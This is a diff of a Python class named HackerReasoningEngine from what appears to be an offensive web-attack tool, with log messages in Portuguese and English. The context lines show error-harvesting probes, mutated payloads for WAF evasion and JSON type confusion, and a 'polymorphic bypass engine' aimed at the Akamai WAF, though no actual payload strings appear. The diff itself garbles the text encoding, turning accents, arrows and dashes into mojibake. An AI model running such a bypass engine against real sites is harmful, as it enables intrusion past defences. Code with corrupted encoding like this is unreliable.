+            "[FALLBACK] DicionÃ¡rio falhou. Ativando Fallback de IA: "
             "Gerando payloads adaptativos baseados no erro do servidor...",
             "error", "hacker_reasoning"
         )
@@ -2478,7 +2478,7 @@ class HackerReasoningEngine:
         test_endpoints = list(test_endpoints)[:15]
 
         self.log(
-            f"[FALLBACK] §1 ERROR HARVESTING — Probing {len(test_endpoints)} endpoints for server error signatures...",
+            f"[FALLBACK] Â§1 ERROR HARVESTING  Probing {len(test_endpoints)} endpoints for server error signatures...",
             "warn", "hacker_reasoning"
         )
 
@@ -2542,25 +2542,25 @@ class HackerReasoningEngine:
                                 self.fallback_techs_identified.append(tech_name)
 
                             self.log(
-                                f"[FALLBACK] ⚡ TECH IDENTIFIED: {tech_name} at {endpoint} "
-                                f"(HTTP {resp.status_code}) — {tp['name']}",
+                                f"[FALLBACK] âš¡ TECH IDENTIFIED: {tech_name} at {endpoint} "
+                                f"(HTTP {resp.status_code})  {tp['name']}",
                                 "error", "hacker_reasoning"
                             )
                             self.log(
-                                f"[FALLBACK] Response body captured: {len(body)} bytes — "
+                                f"[FALLBACK] Response body captured: {len(body)} bytes  "
                                 f"correlating with known {tech_name} vulnerabilities...",
                                 "warn", "hacker_reasoning"
                             )
 
                             for bypass in tech_profile["known_bypasses"][:2]:
                                 self.log(
-                                    f"[FALLBACK]   → KNOWN BYPASS: {bypass}",
+                                    f"[FALLBACK]   â†’ KNOWN BYPASS: {bypass}",
                                     "error", "hacker_reasoning"
                                 )
                         else:
                             self.log(
-                                f"[FALLBACK] Error at {endpoint} — HTTP {resp.status_code} "
-                                f"({len(body)} bytes) — tech unknown, proceeding with generic mutations",
+                                f"[FALLBACK] Error at {endpoint}  HTTP {resp.status_code} "
+                                f"({len(body)} bytes)  tech unknown, proceeding with generic mutations",
                                 "warn", "hacker_reasoning"
                             )
 
@@ -2581,7 +2581,7 @@ class HackerReasoningEngine:
 
         if not error_captures:
             self.log(
-                "[FALLBACK] No server errors captured — endpoints hardened or not reachable. "
+                "[FALLBACK] No server errors captured  endpoints hardened or not reachable. "
                 "Fallback skipping mutation phase.",
                 "info", "hacker_reasoning"
             )
@@ -2589,14 +2589,14 @@ class HackerReasoningEngine:
             return
 
         self.log(
-            f"[FALLBACK] §2 ADAPTIVE REASONING — Captured {len(error_captures)} error responses, "
+            f"[FALLBACK] Â§2 ADAPTIVE REASONING  Captured {len(error_captures)} error responses, "
             f"identified {len(self.fallback_techs_identified)} technologies: "
             f"{', '.join(self.fallback_techs_identified) if self.fallback_techs_identified else 'generic'}",
             "error", "hacker_reasoning"
         )
 
         self.log(
-            f"[FALLBACK] §3 DYNAMIC PAYLOAD GENERATION — Generating 10 mutant variants per error endpoint "
+            f"[FALLBACK] Â§3 DYNAMIC PAYLOAD GENERATION  Generating 10 mutant variants per error endpoint "
             f"(JSON Type Confusion + WAF Evasion + Hybrid Mutations)...",
             "error", "hacker_reasoning"
         )
@@ -2629,7 +2629,7 @@ class HackerReasoningEngine:
             self.fallback_mutations_generated += len(mutants)
 
             self.log(
-                f"[FALLBACK] ━━━ MUTATION TARGET: {endpoint} ({tech_profile.get('tech', 'Unknown')}) ━━━",
+                f"[FALLBACK] â”â”â” MUTATION TARGET: {endpoint} ({tech_profile.get('tech', 'Unknown')}) â”â”â”",
                 "error", "hacker_reasoning"
             )
 
@@ -2715,8 +2715,8 @@ class HackerReasoningEngine:
                             )
 
                         self.log(
-                            f"[FALLBACK] ▸ Mutant #{mutant['index']} [{mutant['technique']}] Gen{mutant['generation']}: "
-                            f"HTTP {capture['status_code']}→{resp.status_code} — {verdict}",
+                            f"[FALLBACK] â–¸ Mutant #{mutant['index']} [{mutant['technique']}] Gen{mutant['generation']}: "
+                            f"HTTP {capture['status_code']}â†’{resp.status_code}  {verdict}",
                             log_level, "hacker_reasoning"
                         )
 
@@ -2738,7 +2738,7 @@ class HackerReasoningEngine:
                     else:
                         self.log(
                             f"[FALLBACK]   Mutant #{mutant['index']} [{mutant['technique']}]: "
-                            f"HTTP {resp.status_code} — same behavior, mutation ineffective",
+                            f"HTTP {resp.status_code}  same behavior, mutation ineffective",
                             "info", "hacker_reasoning"
                         )
                         mutation_result["verdict"] = "NO_CHANGE"
@@ -2761,7 +2761,7 @@ class HackerReasoningEngine:
             total = fallback_entry["mutations_sent"]
 
             self.log(
-                f"[FALLBACK] Endpoint {endpoint}: {total} mutations → "
+                f"[FALLBACK] Endpoint {endpoint}: {total} mutations â†’ "
                 f"{different} behavior changes, {successful} bypasses confirmed",
                 "error" if successful > 0 else ("warn" if different > 0 else "info"),
                 "hacker_reasoning"
@@ -2785,20 +2785,20 @@ class HackerReasoningEngine:
 
         if akamai_detected and all_dicts_failed and error_captures:
             self.log(
-                "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━",
+                "â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”",
                 "error", "hacker_reasoning"
             )
             self.log(
-                "█ AKAMAI AI FALLBACK — POLYMORPHIC BYPASS ENGINE █",
+                "â–ˆ AKAMAI AI FALLBACK  POLYMORPHIC BYPASS ENGINE â–ˆ",
                 "error", "hacker_reasoning"
             )
             self.log(
-                "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━",
+                "â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”",
                 "error", "hacker_reasoning"
             )
             self.log(
-                "[AKAMAI AI] Todos os dicionários falharam. Motor de IA analisando erros 403 da Akamai — "
-                "derivando payloads polimórficos de bypass especializados...",
+                "[AKAMAI AI] Todos os dicionÃ¡rios falharam. Motor de IA analisando erros 403 da Akamai  "
+                "derivando payloads polimÃ³rficos de bypass especializados...",
                 "error", "hacker_reasoning"
             )
             self.emit("hrd_phase", {
@@ -2818,21 +2818,21 @@ class HackerReasoningEngine:
                 ))[:3]
 
             self.log(
-                f"[AKAMAI AI] §1 ANÁLISE DE BLOQUEIO — {len(akamai_403_endpoints)} endpoints com 403 Forbidden. "
-                f"Identificando padrões de regra Akamai...",
+                f"[AKAMAI AI] Â§1 ANÃLISE DE BLOQUEIO  {len(akamai_403_endpoints)} endpoints com 403 Forbidden. "
+                f"Identificando padrÃµes de regra Akamai...",
                 "warn", "hacker_reasoning"
             )
 
             for ep_403 in akamai_403_endpoints:
                 ep_errors = [c for c in error_captures if c["endpoint"] == ep_403]
                 self.log(
-                    f"[AKAMAI AI]   → {ep_403}: {len(ep_errors)} bloqueios, "
+                    f"[AKAMAI AI]   â†’ {ep_403}: {len(ep_errors)} bloqueios, "
                     f"status codes: {set(c['status_code'] for c in ep_errors)}",
                     "warn", "hacker_reasoning"
                 )
 
             self.log(
-                f"[AKAMAI AI] §2 GERAÇÃO POLIMÓRFICA — Lançando {len(AKAMAI_POLYMORPHIC_GENERATORS)} "
+                f"[AKAMAI AI] Â§2 GERAÃ‡ÃƒO POLIMÃ“RFICA  LanÃ§ando {len(AKAMAI_POLYMORPHIC_GENERATORS)} "
                 f"payloads especializados anti-Akamai...",
                 "error", "hacker_reasoning"
             )
@@ -2883,8 +2883,8 @@ class HackerReasoningEngine:
                             self.fallback_mutations_successful += 1
 
                             self.log(
-                                f"[AKAMAI AI] ⚡ BYPASS CONFIRMED: {gen['name']} at {ep} — "
-                                f"HTTP 403→{resp.status_code}!",
+                                f"[AKAMAI AI] âš¡ BYPASS CONFIRMED: {gen['name']} at {ep}  "
+                                f"HTTP 403â†’{resp.status_code}!",
                                 "error", "hacker_reasoning"
                             )
                             self._emit_hrd_finding(
@@ -2909,13 +2909,13 @@ class HackerReasoningEngine:
                         elif status_changed:
                             akamai_result["verdict"] = "BEHAVIOR CHANGE"
                             self.log(
-                                f"[AKAMAI AI] ▸ BEHAVIOR CHANGE: {gen['name']} at {ep} — "
-                                f"HTTP 403→{resp.status_code} (não é bypass mas comportamento diferente)",
+                                f"[AKAMAI AI] â–¸ BEHAVIOR CHANGE: {gen['name']} at {ep}  "
+                                f"HTTP 403â†’{resp.status_code} (nÃ£o Ã© bypass mas comportamento diferente)",
                                 "warn", "hacker_reasoning"
                             )
                         else:
                             self.log(
-                                f"[AKAMAI AI]   {gen['name']}: HTTP {resp.status_code} — blocked, mutação ineficaz",
+                                f"[AKAMAI AI]   {gen['name']}: HTTP {resp.status_code}  blocked, mutaÃ§Ã£o ineficaz",
                                 "info", "hacker_reasoning"
                             )
 
@@ -2933,7 +2933,7 @@ class HackerReasoningEngine:
             self.fallback_mutations_generated += len(self.akamai_fallback_results)
 
             self.log(
-                f"[AKAMAI AI] RESULTADO: {len(self.akamai_fallback_results)} payloads polimórficos testados | "
+                f"[AKAMAI AI] RESULTADO: {len(self.akamai_fallback_results)} payloads polimÃ³rficos testados | "
                 f"{akamai_successes} bypasses confirmados",
                 "error" if akamai_successes > 0 else "warn",
                 "hacker_reasoning"
@@ -2941,19 +2941,19 @@ class HackerReasoningEngine:
 
             if akamai_successes > 0:
                 self.log(
-                    f"[THREAT] {akamai_successes} bypasses Akamai confirmados via motor de IA polimórfico — "
-                    f"WAF Akamai vulnerável a técnicas de evasão avançadas",
+                    f"[THREAT] {akamai_successes} bypasses Akamai confirmados via motor de IA polimÃ³rfico  "
+                    f"WAF Akamai vulnerÃ¡vel a tÃ©cnicas de evasÃ£o avanÃ§adas",
                     "error", "hacker_reasoning"
                 )
             else:
                 self.log(
-                    "[BLOCK] Todos os payloads polimórficos anti-Akamai bloqueados — "
-                    "WAF Akamai resistiu ao motor de IA. Defensibilidade máxima.",
+                    "[BLOCK] Todos os payloads polimÃ³rficos anti-Akamai bloqueados  "
+                    "WAF Akamai resistiu ao motor de IA. Defensibilidade mÃ¡xima.",
                     "warn", "hacker_reasoning"
                 )
 
         self.log(
-            "━━━ RECURSIVE FALLBACK — FINAL ASSESSMENT ━━━",
+            "â”â”â” RECURSIVE FALLBACK  FINAL ASSESSMENT â”â”â”",
             "error", "hacker_reasoning"
         )
         self.log(
@@ -2967,13 +2967,13 @@ class HackerReasoningEngine:
 
         if mutation_successes > 0:
             self.log(
-                f"[THREAT] {mutation_successes} WAF/server bypasses confirmed via adaptive mutation — "
+                f"[THREAT] {mutation_successes} WAF/server bypasses confirmed via adaptive mutation  "
                 f"target is vulnerable to polymorphic attack chains",
                 "error", "hacker_reasoning"
             )
         else:
             self.log(
-                "[BLOCK] All mutations blocked — target resists adaptive fallback. "
+                "[BLOCK] All mutations blocked  target resists adaptive fallback. "
                 "Server-side validation appears robust against type confusion and WAF evasion.",
                 "info", "hacker_reasoning"
             )
@@ -2987,20 +2987,20 @@ class HackerReasoningEngine:
 
     def _compute_escalation_graph(self):
         self.log(
-            "[HRD §5] ESCALATION GRAPH — Computing attack path prioritization...",
+            "[HRD Â§5] ESCALATION GRAPH  Computing attack path prioritization...",
             "warn", "hacker_reasoning"
         )
 
         if not self.escalation_paths:
             self.log(
-                "[HRD] No escalation paths identified — target has limited attack surface",
+                "[HRD] No escalation paths identified  target has limited attack surface",
                 "info", "hacker_reasoning"
             )
             return
 
         for esc in self.escalation_paths:
             self.log(
-                f"[HRD] ESCALATION: [{esc['phase'].upper()}] {esc['from_playbook']} → {esc['escalation'][:80]}",
+                f"[HRD] ESCALATION: [{esc['phase'].upper()}] {esc['from_playbook']} â†’ {esc['escalation'][:80]}",
                 "error", "hacker_reasoning"
             )
 
@@ -3044,7 +3044,7 @@ class HackerReasoningEngine:
 
     def _absorb_incidents(self):
         self.log(
-            "━━━ INCIDENT ABSORBER — DECISION DICTIONARY DUMP LOGIC ━━━",
+            "â”â”â” INCIDENT ABSORBER  DECISION DICTIONARY DUMP LOGIC â”â”â”",
             "error", "hacker_reasoning"
         )
         self.emit("hrd_phase", {"phase": "incident_absorber"})
@@ -3065,7 +3065,7 @@ class HackerReasoningEngine:
 
         if total > 0:
             self.log(
-                f"[ABSORBER] {total} incidents absorbed → {unique} unique evidence entries | "
+                f"[ABSORBER] {total} incidents absorbed â†’ {unique} unique evidence entries | "
                 f"{blocked} raw secrets BLOCKED from persistence",
                 "error", "hacker_reasoning"
             )
@@ -3084,7 +3084,7 @@ class HackerReasoningEngine:
             self.emit("incident_absorber_report", absorber_data)
         else:
             self.log(
-                "[ABSORBER] No critical/high incidents matched severity trigger — evidence table empty",
+                "[ABSORBER] No critical/high incidents matched severity trigger  evidence table empty",
                 "info", "hacker_reasoning"
             )
 
@@ -3094,7 +3094,7 @@ class HackerReasoningEngine:
         high_chains = sum(1 for c in self.reasoning_chains if c["threat_level"] == "high")
 
         self.log(
-            "━━━ HACKER REASONING DICTIONARY — FINAL ASSESSMENT ━━━",
+            "â”â”â” HACKER REASONING DICTIONARY  FINAL ASSESSMENT â”â”â”",
             "error", "hacker_reasoning"
         )
         self.log(
@@ -3108,7 +3108,7 @@ class HackerReasoningEngine:
 
         if critical_chains > 0:
             self.log(
-                f"[THREAT] {critical_chains} CRITICAL + {high_chains} HIGH kill chains identified — "
+                f"[THREAT] {critical_chains} CRITICAL + {high_chains} HIGH kill chains identified  "
                 f"target requires immediate security review",
                 "error", "hacker_reasoning"
             )
@@ -3248,3 +3248,4 @@ class HackerReasoningEngine:
             },
             "incident_absorber": self.incident_absorber.to_dict(),
         }
+
